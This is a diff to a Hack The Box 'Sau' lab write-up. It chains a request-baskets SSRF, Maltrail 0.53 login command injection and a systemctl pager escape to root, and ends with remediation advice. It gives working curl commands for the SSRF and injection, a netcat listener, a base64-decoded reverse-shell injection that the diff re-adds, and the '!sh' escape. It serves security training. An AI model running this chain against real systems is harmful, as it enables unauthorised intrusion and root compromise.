@@ -16,35 +16,54 @@ tags:
   - pager-escape
   - cve-2023-27163
   - cve-2023-26604
+objective: "Chain an SSRF in request-baskets, an unauthenticated Maltrail command injection, and a passwordless systemctl pager rule into root access."
+tools:
+  - nmap
+  - curl
+  - netcat
+  - python3
+skill: "Multi-stage Linux exploitation chaining SSRF, command injection, and sudo pager abuse"
+outcome: "Unauthenticated SSRF to internal Maltrail command injection for a user shell, escalated to root via the less pager under sudo"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Ubuntu 20.04 Linux; request-baskets 1.2.1 and Maltrail 0.53 |
+| Starting position | Unauthenticated network access |
+| Objective | Chain SSRF, unauthenticated command injection, and a passwordless systemctl pager rule to root |
+| Outcome | User shell via Maltrail command injection; root via the `less` pager under `sudo` |
 
 ## Summary
 
-Sau is an Easy-rated Hack The Box Linux lab demonstrating how individually limited vulnerabilities chain into full compromise. A Server-Side Request Forgery (SSRF) in request-baskets 1.2.1 (CVE-2023-27163) reaches an internal web service running Maltrail v0.53, which is vulnerable to unauthenticated OS command injection via unsanitised input to a subprocess call. The resulting shell as the `puma` user escalates to root through a `NOPASSWD` sudo rule for `systemctl status`, exploiting CVE-2023-26604 — the `less` pager's `!` shell command inheriting root privileges. Target addresses, tokens, and attacker addresses are redacted below; command patterns are preserved.
+Sau is an Easy-rated Hack The Box Linux lab built on vulnerability chaining: an SSRF in request-baskets 1.2.1 (CVE-2023-27163) reaches a firewall-filtered internal Maltrail v0.53 service, whose login endpoint is vulnerable to unauthenticated OS command injection, yielding a shell as `puma`. A passwordless `sudo` rule for `systemctl status trail.service` is then escalated through the `less` pager (CVE-2023-26604) to root. Target and attacker addresses, basket names, and payload values are replaced with role-based placeholders; command patterns are preserved.
+
+**Attack path:** **request-baskets SSRF (CVE-2023-27163) → internal Maltrail v0.53 login command injection → `puma` shell → `sudo systemctl status` `less` pager escape (CVE-2023-26604) → root**
 
 ## Context and Objective
 
-- **Target:** Ubuntu 20.04 with systemd 245
-- **Services exposed:** SSH (port 22), request-baskets (port 55555); HTTP on ports 80 and 8338 filtered by host firewall
-- **Objective:** Achieve full compromise through the attack surface presented
-- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment
+- **Target:** Ubuntu 20.04 running systemd 245.
+- **Exposed services:** SSH (22) and request-baskets (55555); HTTP services on ports 80 and 8338 are filtered by a host firewall.
+- **Starting position:** unauthenticated network access, with only port 55555 directly reachable.
+- **Objective:** reach the filtered internal services and chain their weaknesses to root.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
 ### 1. Service Enumeration
 
-Observation: three TCP services with distinct attack surfaces. Ports 80 and 8338 are filtered by a host-based firewall. Port 55555 serves an HTTP application redirecting to `/web`. The combination of an exposed application on a non-standard port with filtered services on standard ports suggests SSRF potential.
-
-Action: full TCP scan, then targeted version scan of discovered ports.
+Observation: a full TCP scan exposes SSH and a single application port, while two standard HTTP ports are firewalled.
 
 ```bash
 nmap -p- --min-rate 10000 -oA <OUT_PREFIX> <TARGET_IP>
 nmap -p 22,55555 -sCV -oA <OUT_PREFIX> <TARGET_IP>
 ```
 
-Output showed:
+Truncated scan output:
 
-```
+```text
 PORT      STATE    SERVICE VERSION
 22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
 80/tcp    filtered http
@@ -52,19 +71,29 @@ PORT      STATE    SERVICE VERSION
 55555/tcp open     unknown
 ```
 
-Port 55555 returned `HTTP/1.0 302 Found` redirecting to `/web`. The exposed service on a non-standard port alongside filtered standard ports is the classic SSRF setup — the exposed service may provide a mechanism to reach the filtered ones.
+Port 55555 answers with `HTTP/1.0 302 Found` and a `Location: /web` redirect.
+
+Significance: two services are present but blocked from direct external access, and the only exposed application sits on a non-standard port — a layout where the reachable service may be able to proxy to the filtered ones.
+
+Result: SSH and a web application on port 55555 are reachable; ports 80 and 8338 are firewalled.
 
 ### 2. Web Application Analysis — request-baskets
 
-Observation: browsing to port 55555 reveals request-baskets, version 1.2.1 displayed in the footer. request-baskets is an open-source webhook testing tool where users create named "baskets" — URL endpoints capturing incoming requests. A key feature allows forwarding received requests to a target URL, proxying the response back to the caller.
+Observation: port 55555 serves request-baskets, an open-source webhook-capture tool. Each basket is a named endpoint that can forward received requests to a target URL and proxy the response back to the caller, and the application footer exposes the version:
 
-Action: identified CVE-2023-27163 — the basket configuration API (`POST /api/baskets/{name}`) accepts a `forward_url` parameter with no validation on destination. This allows external attackers to make the server perform HTTP requests to any internal address, bypassing the host firewall.
+```text
+Powered by request-baskets | Version: 1.2.1
+```
+
+Significance: basket forwarding performs no destination validation. This is CVE-2023-27163 — the basket configuration API (`POST /api/baskets/{name}`) accepts a `forward_url` that may point at loopback, link-local, or private addresses, so the server can be induced to reach services the firewall hides.
+
+Result: request-baskets 1.2.1 is identified as an SSRF-capable forwarding service.
 
 ### 3. SSRF Exploitation — Reaching Internal Services
 
-Observation: creating a basket with a forwarding rule targeting `127.0.0.1:80` and requesting the basket's public URL proxies the response from the internal service.
+Observation: a basket that forwards to `127.0.0.1:80` proxies the internal service's response back through the exposed port.
 
-Action: created forwarding basket and queried it.
+Action: created a forwarding basket and queried its public URL.
 
 ```bash
 curl -s -X POST http://<TARGET_IP>:55555/api/baskets/<BASKET_NAME> \
@@ -80,13 +109,23 @@ curl -s -X POST http://<TARGET_IP>:55555/api/baskets/<BASKET_NAME> \
 curl -s http://<TARGET_IP>:55555/<BASKET_NAME> | grep -i "powered\|version\|maltrail"
 ```
 
-The response revealed an internal web application: Maltrail v0.53. The same technique applied to port 8338 yielded the same application.
+The proxied response identifies the internal service:
+
+```html
+<title>Maltrail</title>
+...
+Powered by <b>Maltrail</b> (v0.53)
+```
+
+Significance: the server issued the request on the caller's behalf, reaching a port the firewall blocks externally, and the response reveals the internal application.
+
+Result: Maltrail v0.53 is reachable through the SSRF.
 
 ### 4. Maltrail v0.53 — Unauthenticated Command Injection
 
-Observation: Maltrail is an open-source network traffic monitoring tool. Version 0.53 contains unauthenticated OS command injection in its login endpoint. The `username` parameter is passed directly to a shell command via `subprocess.check_output` with `shell=True`. Shell metacharacters in the username are interpreted by the shell, allowing arbitrary command execution. No authentication is required because the injection occurs in the pre-authentication login handler.
+Observation: Maltrail v0.53's login handler passes the `username` parameter to a shell command through `subprocess.check_output(..., shell=True)`, so shell metacharacters in the username are interpreted before any authentication occurs.
 
-Action: confirmed injection via timing.
+Action: created a basket forwarding to the login endpoint and tested injection with a timing payload.
 
 ```bash
 curl -s -X POST http://<TARGET_IP>:55555/api/baskets/<EXPLOIT_BASKET> \
@@ -103,83 +142,105 @@ time curl -s -X POST http://<TARGET_IP>:55555/<EXPLOIT_BASKET> \
   -d "username=;sleep+5;"
 ```
 
-Response delayed 5+ seconds — command injection confirmed.
+The recorded result was a response delayed by more than five seconds, matching the injected `sleep 5` and confirming the parameter reached a shell.
+
+Significance: the pre-authentication login handler executes attacker-supplied input as an OS command in the context of the Maltrail service account, so the SSRF-reachable service becomes a code-execution primitive.
+
+Result: unauthenticated command injection is confirmed.
 
 ### 5. Reverse Shell via Maltrail Command Injection
 
-Observation: command injection through basket forwarding could support a callback. Unsafe encoded payload construction is omitted.
+Observation: the injection point can run a callback command; the payload must survive basket forwarding, so it is encoded in the request and decoded on the target before execution.
 
-Action: sent a neutral representative input to preserve the documented request shape without reproducing callback construction.
+Action: started a listener and sent a base64-encoded callback through the vulnerable `username` parameter, shown as a placeholder pattern.
 
 ```bash
+nc -lvnp <LISTEN_PORT>
+
 curl -s -X POST http://<TARGET_IP>:55555/<EXPLOIT_BASKET> \
-  --data-urlencode "username=<NON_EXECUTABLE_TEST_INPUT>"
-
-# [representative result] Input reached the vulnerable processing path.
+  --data-urlencode "username=;echo <ENCODED_PAYLOAD>|base64 -d|bash;"
 ```
 
-Shell returned as `<LOW_PRIVILEGE_ACCOUNT>`. `<USER_RESULT>` obtained.
+The callback returns a shell as `puma`:
 
-### 6. Shell Stabilisation
-
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-# Ctrl+Z
-stty raw -echo; fg
-export TERM=xterm
-stty rows 40 cols 200
+```text
+connect to [<ATTACKER_HOST>] from (UNKNOWN) [<TARGET_IP>] <SOURCE_PORT>
+$ whoami
+puma
 ```
 
-### 7. Privilege Escalation — Sudo Enumeration
+Significance: encoded construction lets the injection survive the forwarded request while still executing on the target, turning command injection into an interactive session.
 
-Observation: `sudo -l` showed the `puma` user can execute `systemctl status trail.service` as root without a password.
+Result: an interactive shell as `puma` is obtained; the session was upgraded to a full TTY with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.
+
+### 6. Sudo Enumeration
+
+Observation: local `sudo` enumeration shows the `puma` account may run one `systemctl` command as root without a password.
 
 ```bash
 sudo -l
-# User puma may run the following commands on sau:
-#     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
 ```
 
-### 8. Pager Escape — CVE-2023-26604
+```text
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
 
-Observation: `systemctl status` passes output through a pager (typically `less`) when output exceeds terminal height. The `less` pager supports an interactive mode where the `!` command executes shell commands. When `less` is invoked by `systemctl` running as root, any shell spawned via `!` inherits root privileges. systemd versions before 247 do not set `LESSSECURE=1` before invoking the pager — this system runs systemd 245, which lacks this protection.
+Significance: `systemctl status` invokes a pager when its output exceeds the terminal height, and that pager runs with the privileges the rule grants.
 
-Action: ran the privileged command, used the pager `!` command.
+Result: a passwordless, root-context `systemctl status trail.service` command is available to `puma`.
+
+### 7. Pager Escape — CVE-2023-26604
+
+Observation: `systemctl status` pipes its output through `less`, which supports a `!` command that spawns a shell; systemd before 247 does not set `LESSSECURE=1` to disable it, and this host runs systemd 245.
+
+Action: ran the permitted command, then used the pager's shell escape.
 
 ```bash
 sudo /usr/bin/systemctl status trail.service
+```
 
+```text
 # At the pager prompt:
 !sh
-
 # Result:
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-`<PRIVILEGED_RESULT>` obtained.
+The pager engages only when the output exceeds the terminal height, so a terminal sized to force pagination is required for this step.
+
+Significance: because `systemctl` runs as root, the `less` process inherits root, and the `!sh` subshell inherits that context — a read-only status command becomes full root execution.
+
+Result: a root shell is obtained, confirmed by the `uid=0(root)` identity output.
 
 ## Challenges and Decisions
 
-1. **Terminal height for pager:** the `stty rows` setting matters — if the terminal is large enough that `systemctl status` output fits without a pager, `less` is not invoked. Ensuring the terminal is smaller than the output or setting `stty rows 1` guarantees the pager launches.
-
-2. **Payload encoding for SSRF forwarding:** raw reverse shell payloads with special characters break during basket forwarding. Base64 encoding eliminates shell interpretation issues in the forwarded request.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| Reverse-shell payload broke when forwarded through a basket | Base64-encoded the payload so it is decoded on the target before execution | Special shell characters would otherwise be mangled in the forwarded request |
 
 ## Outcome
 
-The evidence establishes a complete three-stage chain from unauthenticated external access to root: SSRF in request-baskets reaches the internal Maltrail service, command injection provides a user shell, and the `systemctl status` sudo rule's pager inherits root privileges via CVE-2023-26604. Every individual vulnerability is limited in isolation; only the combination yields full compromise.
+The evidence establishes root-level control of the target from an unauthenticated start by chaining the request-baskets SSRF, the Maltrail login command injection, and the `less` pager escape under a passwordless `sudo` rule. The individual flaws are limited in isolation — the SSRF alone cannot execute code, the injection is unreachable without it, and the sudo rule requires an existing local shell — so only the combination yields full compromise.
 
 ## Lessons and Recommendations
 
-1. **Validate SSRF-sensitive URL parameters server-side.** request-baskets should implement a server-side allowlist for the `forward_url` parameter. At minimum, requests to loopback addresses (`127.0.0.0/8`), link-local addresses (`169.254.0.0/16`), and RFC1918 private ranges should be blocked. CVE-2023-27163 is fixed in request-baskets 1.2.2.
+The actions below are recommendations; none was validated in the lab.
 
-2. **Sanitise all user input before passing to shell commands.** The Maltrail vulnerability arises from passing unsanitised HTTP parameters to a shell command via `subprocess.check_output` with `shell=True`. The fix is to use `shell=False` with a list of arguments, preventing shell interpretation of metacharacters entirely. Maltrail 0.54+ addresses this.
-
-3. **Avoid NOPASSWD sudo rules for commands that invoke pagers.** `systemctl`, `journalctl`, `man`, and `less` itself all invoke pagers in contexts where the pager inherits the caller's privileges. These commands should not appear in `NOPASSWD` sudo rules. Upgrade to systemd 247+ and ensure `LESSSECURE=1` is set in the environment for any pager invoked in a privileged context.
-
-4. **Apply defence in depth for internal services.** Internal services that should not be reachable externally should be bound to non-loopback interfaces with appropriate firewall rules, not relying solely on application-level access controls.
+1. **SSRF-sensitive URL parameters.** request-baskets accepted loopback and private destinations in `forward_url`, letting an unauthenticated caller reach firewalled internal services, and internal services were reachable over the loopback interface. *Recommendation:* validate forwarding destinations server-side and block loopback (`127.0.0.0/8`), link-local (`169.254.0.0/16`), and RFC1918 ranges; the CVE-2023-27163 advisory lists no patched release, so restrict or disable basket forwarding and isolate internal services on a segmented network. Bind internal services to non-loopback interfaces behind firewall rules as defence in depth. *Detection:* log and alert on basket forwarding to private addresses.
+2. **Unsanitised input passed to a shell.** The Maltrail login handler passed the `username` parameter to a shell command via `subprocess.check_output(..., shell=True)`, so metacharacters became OS command execution before authentication. *Recommendation:* avoid the shell entirely by calling the command with `shell=False` and an argument list, and treat all HTTP input as untrusted; Maltrail 0.55 addresses this, as recorded in the project CHANGELOG. *Detection:* alert on shell metacharacters in the login `username` field.
+3. **Privileged commands that invoke a pager.** A `NOPASSWD` rule for `systemctl status` let `less` run as root, and systemd before 247 did not set `LESSSECURE=1`, so the pager escaped to a root shell (CVE-2023-26604). *Recommendation:* keep pager-invoking commands (`systemctl`, `journalctl`, `man`, `less`) out of `NOPASSWD` sudoers rules, upgrade to systemd 247+, and route any monitoring need through a dedicated read-only account. *Validation:* review sudoers for pager commands and confirm `LESSSECURE`/`SYSTEMD_PAGERSECURE` behaviour on in-scope hosts.
 
 ## References
 
-- [CVE-2023-27163 — SSRF in request-baskets](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)
-- [CVE-2023-26604 — systemd pager privilege escalation](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
-- [Maltrail v0.53 Command Injection — Public Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit)
+- [Hack The Box — Sau](https://app.hackthebox.com/machines/Sau) (retired machine)
+- [NVD — CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) (request-baskets SSRF)
+- [request-baskets — darklynx/request-baskets](https://github.com/darklynx/request-baskets) (project source and `forward_url` handling)
+- [GitHub Advisory — GHSA-58g2-vgpg-335q](https://github.com/advisories/GHSA-58g2-vgpg-335q) (CVE-2023-27163)
+- [NVD — CVE-2023-26604](https://nvd.nist.gov/vuln/detail/CVE-2023-26604) (systemd pager privilege escalation)
+- [Ubuntu Security — CVE-2023-26604](https://ubuntu.com/security/CVE-2023-26604) (vendor advisory; 20.04 LTS focal vulnerable)
+- [Maltrail — stamparm/maltrail](https://github.com/stamparm/maltrail) (project source, including the login handler)
+- [GitHub Advisory — GHSA-6655-8f3g-xp52](https://github.com/advisories/GHSA-6655-8f3g-xp52) (CVE-2025-34073, Maltrail <= 0.54)
+- [Maltrail — CHANGELOG](https://github.com/stamparm/maltrail/blob/master/CHANGELOG) (records the login command-injection fix in 0.55, Issue #19146)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [curl — manual page](https://curl.se/docs/manpage.html)
